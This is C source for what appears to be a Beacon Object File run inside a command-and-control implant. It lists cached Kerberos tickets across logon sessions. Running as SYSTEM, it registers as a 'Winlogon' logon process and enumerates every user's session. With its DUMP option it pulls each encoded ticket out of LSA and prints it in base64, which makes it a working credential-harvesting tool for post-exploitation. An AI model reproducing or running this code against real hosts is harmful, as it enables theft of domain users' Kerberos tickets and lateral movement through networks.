#include "_include/functions.c"

SYSTEMTIME ConvertToSystemtime(LARGE_INTEGER li) {
    FILETIME ft;
    SYSTEMTIME st_utc;
    ft.dwHighDateTime = li.HighPart;
    ft.dwLowDateTime = li.LowPart;
    KERNEL32$FileTimeToSystemTime(&ft, &st_utc);
    return st_utc;
}

HANDLE GetCurrentToken(DWORD DesiredAccess) {
    HANDLE hCurrentToken = NULL;
    if (!ADVAPI32$OpenThreadToken(KERNEL32$GetCurrentThread(), DesiredAccess, FALSE, &hCurrentToken))
        if (hCurrentToken == NULL && KERNEL32$GetLastError() == ERROR_NO_TOKEN)
            if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), DesiredAccess, &hCurrentToken))
                return NULL;
    return hCurrentToken;
}

LUID GetCurrentLUID(HANDLE TokenHandle) {
    TOKEN_STATISTICS tokenStats;
    DWORD tokenSize;
    if (!ADVAPI32$GetTokenInformation(TokenHandle, TokenStatistics, &tokenStats, sizeof(tokenStats), &tokenSize))
        return (LUID) { 0 };
    return tokenStats.AuthenticationId;
}

BOOL IsSystem(HANDLE TokenHandle) {
    UCHAR bTokenUser[sizeof(TOKEN_USER) + 8 + 4 * SID_MAX_SUB_AUTHORITIES];
    PTOKEN_USER pTokenUser = (PTOKEN_USER)bTokenUser;
    ULONG cbTokenUser;
    SID_IDENTIFIER_AUTHORITY siaNT = SECURITY_NT_AUTHORITY;
    PSID pSystemSid = NULL;
    BOOL bSystem = FALSE;

    // Try to open the token of the current thread first
    if (!ADVAPI32$OpenThreadToken(KERNEL32$GetCurrentThread(), TOKEN_QUERY, TRUE, &TokenHandle)) {
        // If there is no thread token, fall back to the process token
        if (KERNEL32$GetLastError() == ERROR_NO_TOKEN) {
            if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_QUERY, &TokenHandle)) {
                return FALSE;
            }
        } else {
            return FALSE;
        }
    }

    if (!ADVAPI32$GetTokenInformation(TokenHandle, TokenUser, pTokenUser, sizeof(bTokenUser), &cbTokenUser)) {
        return FALSE;
    }

    if (!ADVAPI32$AllocateAndInitializeSid(&siaNT, 1, SECURITY_LOCAL_SYSTEM_RID, 0, 0, 0, 0, 0, 0, 0, &pSystemSid)) {
        return FALSE;
    }

    bSystem = ADVAPI32$EqualSid(pTokenUser->User.Sid, pSystemSid);

    ADVAPI32$FreeSid(pSystemSid);

    return bSystem;
}

BOOL GetLsaHandle(HANDLE hToken, BOOL highIntegrity, HANDLE* hLsa) {
    HANDLE hLsaLocal = NULL;
    ULONG  mode = 0;
    bool   status = true;
    if (highIntegrity) {
        STRING lsaString = (STRING){ .Length = 8, .MaximumLength = 9, .Buffer = "Winlogon" };
        status = SECUR32$LsaRegisterLogonProcess(&lsaString, &hLsaLocal, &mode);
    }
    else {
        status = SECUR32$LsaConnectUntrusted(&hLsaLocal);
    }
    *hLsa = hLsaLocal;
    return status;
}

BOOL GetLogonSessionData(LUID luid, LOGON_SESSION_DATA* data) {
    LOGON_SESSION_DATA           sessionData = { 0 };
    SECURITY_LOGON_SESSION_DATA* logonData = NULL;
    if (luid.LowPart != 0) {
        if (SECUR32$LsaGetLogonSessionData(&luid, &logonData)) return true;
        sessionData.sessionData = MemAlloc(sizeof(*sessionData.sessionData));
        sessionData.sessionCount = 1;
        sessionData.sessionData[0] = logonData;
        *data = sessionData;
    }
    else {
        ULONG logonSessionCount;
        PLUID logonSessionList;
        if (SECUR32$LsaEnumerateLogonSessions(&logonSessionCount, &logonSessionList)) return true;

        sessionData.sessionData = MemAlloc(logonSessionCount * sizeof(*sessionData.sessionData));
        sessionData.sessionCount = logonSessionCount;
        for (int i = 0; i < logonSessionCount; i++) {
            LUID luid = logonSessionList[i];

            if (SECUR32$LsaGetLogonSessionData(&luid, &logonData))
                sessionData.sessionData[i] = NULL;
            else
                sessionData.sessionData[i] = logonData;
        }
        SECUR32$LsaFreeReturnBuffer(logonSessionList);
        *data = sessionData;
    }
    return false;
}

#ifdef DUMP
char* base64_encode(byte* input, size_t input_len) {
    char base64_chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    size_t output_len = 4 * ((input_len + 2) / 3);
    byte* output = MemAlloc(output_len + 1);
    if (output == NULL)
        return NULL;

    size_t i = 0, j = 0;
    while (i < input_len) {
        UINT octet_a = i < input_len ? input[i++] : 0;
        UINT octet_b = i < input_len ? input[i++] : 0;
        UINT octet_c = i < input_len ? input[i++] : 0;

        UINT triple = (octet_a << 0x10) + (octet_b << 0x08) + octet_c;

        output[j++] = base64_chars[(triple >> 3 * 6) & 0x3F];
        output[j++] = base64_chars[(triple >> 2 * 6) & 0x3F];
        output[j++] = base64_chars[(triple >> 1 * 6) & 0x3F];
        output[j++] = base64_chars[(triple >> 0 * 6) & 0x3F];
    }

    if (input_len % 3 == 1) {
        output[output_len - 1] = '=';
        output[output_len - 2] = '=';
    }
    else if (input_len % 3 == 2) {
        output[output_len - 1] = '=';
    }

    output[output_len] = '\0';
    return output;
}

bool ExtractTicket(HANDLE hLsa, ULONG authPackage, LUID luid, UNICODE_STRING targetName, byte** ticket, int* ticketSize) {
    KERB_RETRIEVE_TKT_RESPONSE* retrieveResponse = NULL;
    ULONG responseSize = sizeof(KERB_RETRIEVE_TKT_REQUEST) + targetName.MaximumLength;
    KERB_RETRIEVE_TKT_REQUEST* retrieveRequest = MemAlloc(responseSize);

    retrieveRequest->MessageType = KerbRetrieveEncodedTicketMessage;
    retrieveRequest->LogonId = luid;
    retrieveRequest->TicketFlags = 0;
    retrieveRequest->CacheOptions = KERB_RETRIEVE_TICKET_AS_KERB_CRED;
    retrieveRequest->EncryptionType = 0;
    retrieveRequest->TargetName = targetName;
    retrieveRequest->TargetName.Buffer = (PWSTR)((PBYTE)retrieveRequest + sizeof(KERB_RETRIEVE_TKT_REQUEST));
    MemCpy(retrieveRequest->TargetName.Buffer, targetName.Buffer, targetName.MaximumLength);

    NTSTATUS protocolStatus;
    bool status = SECUR32$LsaCallAuthenticationPackage(hLsa, authPackage, retrieveRequest, responseSize, &retrieveResponse, &responseSize, &protocolStatus);
    if (!status && !protocolStatus) {
        if (responseSize > 0) {
            ULONG size = retrieveResponse->Ticket.EncodedTicketSize;
            *ticket = (PUCHAR)MemAlloc(size);
            MemCpy(*ticket, retrieveResponse->Ticket.EncodedTicket, size);
            *ticketSize = size;
            return true;
        }
    }
    return false;
}
#endif

void PrintTicketInfo(KERB_TICKET_CACHE_INFO_EX cacheInfo, LUID luid) {
    SYSTEMTIME EndTime = ConvertToSystemtime(cacheInfo.EndTime);

    int length = cacheInfo.ClientName.Length / 2 + cacheInfo.ClientRealm.Length / 2 + 4;
    char* client = MemAlloc(length);
    KERNEL32$WideCharToMultiByte(CP_ACP, 0, cacheInfo.ClientName.Buffer, cacheInfo.ClientName.Length / 2, client, length, NULL, 0);
    MemCpy(client + cacheInfo.ClientName.Length / 2, " @ ", 3);
    KERNEL32$WideCharToMultiByte(CP_ACP, 0, cacheInfo.ClientRealm.Buffer, cacheInfo.ClientRealm.Length / 2, client + cacheInfo.ClientName.Length / 2 + 3, cacheInfo.ClientRealm.Length / 2 + 1, NULL, 0);
    char* servername = MemAlloc(cacheInfo.ServerName.Length / 2 + 1);
    KERNEL32$WideCharToMultiByte(CP_ACP, 0, cacheInfo.ServerName.Buffer, cacheInfo.ServerName.Length / 2, servername, cacheInfo.ServerName.Length / 2 + 1, NULL, 0);

#ifdef TRIAGE
    PRINT_OUT("| %lx:0x%-7lx | %-40s | %-40s | %02d.%02d.%04d %02d:%02d:%02d |\n", luid.HighPart, luid.LowPart, client, servername, EndTime.wDay, EndTime.wMonth, EndTime.wYear, EndTime.wHour, EndTime.wMinute, EndTime.wSecond);
#else
        char* serverrealm = MemAlloc(cacheInfo.ServerRealm.Length / 2 + 1);
        KERNEL32$WideCharToMultiByte(CP_ACP, 0, cacheInfo.ServerRealm.Buffer, cacheInfo.ServerRealm.Length / 2, serverrealm, cacheInfo.ServerRealm.Length / 2 + 1, NULL, 0);

        SYSTEMTIME StartTime = ConvertToSystemtime(cacheInfo.StartTime);
        SYSTEMTIME RenewTime = ConvertToSystemtime(cacheInfo.RenewTime);
        uint flags = cacheInfo.TicketFlags;

        PRINT_OUT("\tClientName               :  %s\n", client);
        PRINT_OUT("\tServiceRealm             :  %s @ %s\n", servername, serverrealm);

        PRINT_OUT("\tStartTime (UTC)          :  %02d.%02d.%04d %02d:%02d:%02d\n", StartTime.wDay, StartTime.wMonth, StartTime.wYear, StartTime.wHour, StartTime.wMinute, StartTime.wSecond);
        PRINT_OUT("\tEndTime (UTC)            :  %02d.%02d.%04d %02d:%02d:%02d\n", EndTime.wDay, EndTime.wMonth, EndTime.wYear, EndTime.wHour, EndTime.wMinute, EndTime.wSecond);
        PRINT_OUT("\tRenewTill (UTC)          :  %02d.%02d.%04d %02d:%02d:%02d\n", RenewTime.wDay, RenewTime.wMonth, RenewTime.wYear, RenewTime.wHour, RenewTime.wMinute, RenewTime.wSecond);

        PRINT_OUT("\tFlags                    :  ");
        if (flags & reserved)		PRINT_OUT("reserved ");
        if (flags & forwardable)	PRINT_OUT("forwardable ");
        if (flags & forwarded)		PRINT_OUT("forwarded ");
        if (flags & proxiable)		PRINT_OUT("proxiable ");
        if (flags & proxy)			PRINT_OUT("proxy ");
        if (flags & may_postdate)	PRINT_OUT("may_postdate ");
        if (flags & postdated)		PRINT_OUT("postdated ");
        if (flags & invalid)		PRINT_OUT("invalid ");
        if (flags & renewable)		PRINT_OUT("renewable ");
        if (flags & initial)		PRINT_OUT("initial ");
        if (flags & pre_authent)	PRINT_OUT("pre_authent ");
        if (flags & hw_authent)		PRINT_OUT("hw_authent ");
        if (flags & ok_as_delegate) PRINT_OUT("ok_as_delegate ");
        if (flags & anonymous)		PRINT_OUT("anonymous ");
        if (flags & enc_pa_rep)		PRINT_OUT("enc_pa_rep ");
        if (flags & reserved1)		PRINT_OUT("reserved1 ");
        PRINT_OUT("\n");

        if (cacheInfo.EncryptionType == rc4_hmac)
            PRINT_OUT("\tKeyType                  :  rc4_hmac\n");
        else if (cacheInfo.EncryptionType == aes128_cts_hmac_sha1)
            PRINT_OUT("\tKeyType                  :  aes128_cts_hmac_sha1\n");
        else if (cacheInfo.EncryptionType == aes256_cts_hmac_sha1)
            PRINT_OUT("\tKeyType                  :  aes256_cts_hmac_sha1\n");
        PRINT_OUT("\n");
#endif
}

#ifndef TRIAGE
void PrintLogonSessionData(SECURITY_LOGON_SESSION_DATA data) {
    char* sid = NULL;
    char* username = MemAlloc(data.UserName.Length / 2 + 1);
    KERNEL32$WideCharToMultiByte(CP_ACP, 0, data.UserName.Buffer, data.UserName.Length / 2, username, data.UserName.Length / 2 + 1, NULL, 0);
    char* domain = MemAlloc(data.LogonDomain.Length / 2 + 1);
    KERNEL32$WideCharToMultiByte(CP_ACP, 0, data.LogonDomain.Buffer, data.LogonDomain.Length / 2, domain, data.LogonDomain.Length / 2 + 1, NULL, 0);
    char* authpack = MemAlloc(data.AuthenticationPackage.Length / 2 + 1);
    KERNEL32$WideCharToMultiByte(CP_ACP, 0, data.AuthenticationPackage.Buffer, data.AuthenticationPackage.Length / 2, authpack, data.AuthenticationPackage.Length / 2 + 1, NULL, 0);
    char* server = MemAlloc(data.LogonServer.Length / 2 + 1);
    KERNEL32$WideCharToMultiByte(CP_ACP, 0, data.LogonServer.Buffer, data.LogonServer.Length / 2, server, data.LogonServer.Length / 2 + 1, NULL, 0);
    char* upn = MemAlloc(data.Upn.Length / 2 + 1);
    KERNEL32$WideCharToMultiByte(CP_ACP, 0, data.Upn.Buffer, data.Upn.Length, upn, data.Upn.Length, NULL, 0);

    PRINT_OUT("UserName                : %s\n", username);
    PRINT_OUT("Domain                  : %s\n", domain);
    PRINT_OUT("LogonId                 : %lx:0x%lx\n", data.LogonId.HighPart, data.LogonId.LowPart);
    PRINT_OUT("Session                 : %ld\n", data.Session);
    if (ADVAPI32$ConvertSidToStringSidA(data.Sid, &sid))
        PRINT_OUT("UserSID                 : %s\n", sid);
    else
        PRINT_OUT("UserSID                 : -\n");
    PRINT_OUT("Authentication package  : %s\n", authpack);
    PRINT_OUT("LogonServer             : %s\n", server);
    PRINT_OUT("UserPrincipalName       : %s\n", upn);
    PRINT_OUT("\n");
}
#endif

int my_isdigit(int c) {
    return (c >= '0' && c <= '9');
}

int my_islower(int c) {
    return (c >= 'a' && c <= 'z');
}

long int my_strtol(const char* str, char** endptr, int base) {
    long int result = 0;
    int sign = 1;

    if (*str == '-' || *str == '+') {
        sign = (*str == '-') ? -1 : 1;
        str++;
    }

    while (my_isdigit(*str) ||
           (base == 16 && (*str >= 'a' && *str <= 'f')) ||
           (base == 16 && (*str >= 'A' && *str <= 'F'))) {
        int digit = 0;
        if (my_isdigit(*str)) {
            digit = *str - '0';
        }
        else if (base == 16) {
            digit = (my_islower(*str) ? (*str - 'a' + 10) : (*str - 'A' + 10));
        }

        if (digit >= base)
            break;

        if (result > (LONG_MAX - digit) / base) {
            if (sign == 1)
                return LONG_MAX;
            else
                return LONG_MIN;
        }

        result = result * base + digit;
        str++;
    }

    if (endptr != NULL)
        *endptr = (char*)str;

    return result * sign;
}

void KLIST( char* luid, char* targetService, char* targetUser, char* targetClient ) {
    LUID   targetLuid = { 0 };
    HANDLE hToken = GetCurrentToken(TOKEN_QUERY);
    BOOL IsHighIntegrity = IsSystem(hToken);

    if (!IsHighIntegrity && (luid || targetUser)) {
        PRINT_OUT("[X] You need to be in SYSTEM integrity.\n");
        return;
    }

    if (luid) {
        targetLuid.LowPart = my_strtol(luid, NULL, 16);
        if (targetLuid.LowPart == 0 || targetLuid.LowPart == LONG_MAX || targetLuid.LowPart == LONG_MIN) {
            PRINT_OUT("[x] Invalid luid\n");
            return;
        }
        PRINT_OUT("\nAction: List Kerberos Tickets( LUID: %s)\n\n", luid);
    }
    else if (IsHighIntegrity) {
        if( targetUser )
            PRINT_OUT("\nAction: List Kerberos Tickets for '%s'\n\n", targetUser);
        else
            PRINT_OUT("\nAction: List Kerberos Tickets (All Users)\n\n");
    }
    else {
        targetLuid = GetCurrentLUID(hToken);
        PRINT_OUT("\nAction: List Kerberos Tickets (Current User)\n\n");
    }

    if (targetService)
        PRINT_OUT("[*] Target service  : %s\n", targetService);
    if (targetClient)
        PRINT_OUT("[*] Target client   : %s\n", targetClient);
    if (targetUser)
        PRINT_OUT("[*] Target user     : %s\n", targetUser);
    if (luid)
        PRINT_OUT("[*] Target LUID     : %s\n", luid);
    PRINT_OUT("\n");

#ifdef TRIAGE
        PRINT_OUT("--------------------------------------------------------------------------------------------------------------------------\n");
        PRINT_OUT("| %-11s | %-40s | %-40s | %19s |\n", "LUID", "Client", "Service", "End Time");
        PRINT_OUT("--------------------------------------------------------------------------------------------------------------------------\n");
#endif

    HANDLE hLsa;
    if (GetLsaHandle(hToken, IsHighIntegrity, &hLsa)) return;

    ULONG authPackage;
    LSA_STRING krbAuth = { .Buffer = "kerberos",.Length = 8,.MaximumLength = 9 };
    if (SECUR32$LsaLookupAuthenticationPackage(hLsa, &krbAuth, &authPackage) == 0) {

        LOGON_SESSION_DATA sessionData;
        if (GetLogonSessionData(targetLuid, &sessionData) == 0) {
            KERB_QUERY_TKT_CACHE_REQUEST cacheRequest;
            cacheRequest.MessageType = KerbQueryTicketCacheExMessage;

            for (int i = 0; i < sessionData.sessionCount; i++) {
                if (sessionData.sessionData[i] == NULL)
                    continue;

                if (targetUser) {
                    int usernameLength = (*sessionData.sessionData[i]).UserName.Length / 2;
                    char* username = MemAlloc(usernameLength + 1);
                    KERNEL32$WideCharToMultiByte(CP_ACP, 0, (*sessionData.sessionData[i]).UserName.Buffer, usernameLength, username, usernameLength + 1, NULL, 0);
                    StrToLower(username);
                    StrToLower(targetUser);
                    if (my_strncmp(targetUser, username, my_strlen(targetUser) + 1) != 0) {
                        continue;
                    }
                }

                if (IsHighIntegrity)
                    cacheRequest.LogonId = sessionData.sessionData[i]->LogonId;
                else
                    cacheRequest.LogonId = (LUID){ 0 };

#ifndef TRIAGE
                    PrintLogonSessionData((*sessionData.sessionData[i]));
#endif
                LUID user_luid = (*sessionData.sessionData[i]).LogonId;
                SECUR32$LsaFreeReturnBuffer(sessionData.sessionData[i]);
                KERB_QUERY_TKT_CACHE_EX_RESPONSE* cacheResponse = NULL;
                KERB_TICKET_CACHE_INFO_EX cacheInfo;
                ULONG responseSize;
                NTSTATUS protocolStatus;
                if (SECUR32$LsaCallAuthenticationPackage(hLsa, authPackage, &cacheRequest, sizeof(cacheRequest), &cacheResponse, &responseSize, &protocolStatus)) continue;
                if (cacheResponse == NULL)
                    continue;

                int ticketCount = cacheResponse->CountOfTickets;
#ifndef TRIAGE
                    PRINT_OUT("[*] Cached tickets: (%d)\n\n", ticketCount);
#endif
                if (ticketCount > 0) {
                    int tkt_index = 0;
                    for (int j = 0; j < ticketCount; j++) {
                        bool includeTicket = true;
                        cacheInfo = cacheResponse->Tickets[j];

                        if (targetService) {
                            int serviceLength = cacheInfo.ServerName.Length / 2;
                            char* service = MemAlloc(serviceLength + 1);
                            KERNEL32$WideCharToMultiByte(CP_ACP, 0, cacheInfo.ServerName.Buffer, serviceLength, service, serviceLength + 1, NULL, 0);
                            StrToLower(service);
                            StrToLower(targetService);
                            if (my_strncmp(targetService, service, my_strlen(targetService)) != 0)
                                includeTicket = false;
                        }

                        if (targetClient) {
                            int clientLength = cacheInfo.ClientName.Length / 2;
                            char* client = MemAlloc(clientLength + 1);
                            KERNEL32$WideCharToMultiByte(CP_ACP, 0, cacheInfo.ClientName.Buffer, clientLength, client, clientLength + 1, NULL, 0);
                            StrToLower(client);
                            StrToLower(targetClient);
                            if (my_strncmp(targetClient, client, my_strlen(targetClient) + 1) != 0)
                                includeTicket = false;
                        }

                        if (includeTicket) {
#ifndef TRIAGE
                                PRINT_OUT("  [%d]\n", tkt_index++);
#endif
                            PrintTicketInfo(cacheInfo, user_luid);

#ifdef DUMP
                                byte* ticket = NULL;
                                int ticketSize = 0;
                                if (ExtractTicket(hLsa, authPackage, cacheRequest.LogonId, cacheInfo.ServerName, &ticket, &ticketSize)) {
                                    char* base_ticket = base64_encode(ticket, ticketSize);
                                    PRINT_OUT("\t%s\n\n", base_ticket);
                                }
#endif
                        }
                    }
                }
                SECUR32$LsaFreeReturnBuffer(cacheResponse);
            }
        }
    }
#ifdef TRIAGE
        PRINT_OUT("--------------------------------------------------------------------------------------------------------------------------\n");
#endif
    SECUR32$LsaDeregisterLogonProcess(hLsa);
}

void KLIST_RUN( PCHAR Buffer, IN DWORD Length ) {
    char* luid = NULL;
    char* targetUser = NULL;
    char* targetService = NULL;
    char* targetClient = NULL;

    for (int i = 0; i < Length; i++) {
        i += GetStrParam(Buffer + i, Length - i, "/luid:", 6, &luid );
        i += GetStrParam(Buffer + i, Length - i, "/user:", 6, &targetUser );
        i += GetStrParam(Buffer + i, Length - i, "/service:", 9, &targetService );
        i += GetStrParam(Buffer + i, Length - i, "/client:", 8, &targetClient );
    }
#ifdef TRIAGE
    KLIST(luid, targetService, targetUser, targetClient);
#else
    KLIST(luid, targetService, targetUser, targetClient);
#endif
}

VOID go( IN PCHAR Buffer, IN ULONG Length ) {
    INIT_BOF();

    datap parser;
    BeaconDataParse(&parser, Buffer, Length);
    DWORD PARAM_SIZE = 0;
    PBYTE PARAM = BeaconDataExtract(&parser, &PARAM_SIZE);

    if( LoadFunc() )
        PRINT_OUT("%s\n", "Modules not loaded");
    else
        KLIST_RUN( PARAM, PARAM_SIZE );

    FreeBank();

    END_BOF();
}